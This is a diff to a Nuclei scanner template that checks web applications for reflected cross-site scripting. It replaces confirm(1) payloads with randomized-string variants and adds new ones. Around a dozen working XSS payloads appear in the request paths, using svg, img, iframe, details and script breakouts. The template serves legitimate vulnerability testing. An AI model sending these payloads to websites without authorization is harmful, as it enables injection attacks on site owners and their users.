@@ -4,7 +4,7 @@ info:
   name: Cross-Site Scripting (XSS) Nuclei Scanner
   author: twseptian
   severity: Medium
-  description: XSS for GET HTTP Method
+  description: Reflected XSS
   reference: 
       - https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)
   tags: xss,cross-site-scripting
@@ -12,22 +12,24 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}'><Svg Only=1 OnLoad=confirm(1)>"
-      - "{{baseURL}}'</TITLE><SCRIPT>confirm(1)%3b</SCRIPT>"
-      - "{{BaseURL}}'><details/open/ontoggle=confirm(1)>"
-      - "{{BaseURL}}'><svg><circle><set onbegin=confirm(1) attributename=fill>"
-      - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
-      - "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
-      - "{{BaseURL}}'<iframe/onload=confirm(1)>"
-      - "{{baseURL}}'<style><img title=%22</style><img src onerror=confirm(1)>%22></style>"
-      - "{{baseURL}}'<noscript><img title=%22</noscript><img src onerror=confirm(1)>%22></noscript>"
+      - "{{BaseURL}}'><Svg Only=1 OnLoad=confirm('{{randstr}}')>"
+      - "{{baseURL}}'</TITLE><SCRIPT>confirm('{{randstr}}')%3b</SCRIPT>"
+      - "{{baseURL}}';confirm('{{randstr}}');//"
+      - "{{baseURL}}'<svg onload=confirm('{{randstr}}')<!--"
+      - "{{BaseURL}}'><details/open/ontoggle=confirm('{{randstr}}')>"
+      - "{{BaseURL}}'><svg><circle><set onbegin=confirm('{{randstr}}') attributename=fill>"
+      - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm('{{randstr}}')%3E/"
+      - "{{BaseURL}}'</script><img src=x onerror=confirm('{{randstr}}')>"
+      - "{{BaseURL}}'<iframe/onload=confirm('{{randstr}}')>"
+      - "{{baseURL}}'<style><img title=%22</style><img src onerror=confirm('{{randstr}}')>%22></style>"
+      - "{{baseURL}}'<noscript><img title=%22</noscript><img src onerror=confirm('{{randstr}}')>%22></noscript>"
 
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-            - "confirm(1)"
+            - '{{randstr}}'
         condition: and
 
       - type: status
